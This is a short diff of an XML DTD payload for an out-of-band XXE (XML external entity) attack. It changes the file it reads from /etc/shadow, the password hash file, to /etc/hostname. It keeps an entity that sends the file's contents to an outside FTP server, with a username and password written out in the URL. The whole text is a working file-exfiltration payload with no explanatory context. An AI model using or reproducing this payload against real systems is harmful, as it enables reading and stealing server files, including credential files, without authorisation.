@@ -1,2 +1,2 @@
-<!ENTITY % three SYSTEM "file:///etc/shadow">
+<!ENTITY % three SYSTEM "file:///etc/hostname">
 <!ENTITY % two "<!ENTITY four SYSTEM 'ftp://unclebenz:Welcome2@ftp.drivehq.com:21/%three;'>">
